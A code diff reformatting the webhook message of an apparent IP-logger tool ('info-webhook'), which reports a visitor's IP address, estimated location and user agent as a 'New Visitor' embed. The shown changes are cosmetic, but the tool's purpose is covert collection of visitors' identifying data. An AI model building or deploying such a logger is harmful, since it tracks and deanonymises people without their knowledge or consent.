@@ -43,37 +43,36 @@ export default async (req, res) => {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        username: "Info Webhook",
-        avatar_url:
-          "https://i.pinimg.com/736x/c0/74/9b/c0749b7cc401421662ae901ec8f9f660.jpg",
+        content: null,
         embeds: [
           {
-            title: "IP Logged",
+            title: "New Visitor",
             description: openedBy,
-            color: 0xff0000,
+            color: 16711680,
             fields: [
               {
                 name: "Visitor's IP",
                 value: ipAddress || "Unknown",
-                inline: true,
               },
               {
                 name: "Estimated Location",
                 value: location || "Unknown",
-                inline: true,
               },
               {
                 name: "User-Agent",
                 value: userAgent || "Unknown",
-                inline: true,
               },
             ],
             footer: {
               text: "github.com/crunny/info-webhook",
             },
-            timestamp: new Date(),
+            timestamp: new Date().toISOString(),
           },
         ],
+        username: "Info Webhook",
+        avatar_url:
+          "https://i.pinimg.com/736x/c0/74/9b/c0749b7cc401421662ae901ec8f9f660.jpg",
+        attachments: [],
       }),
     });
 
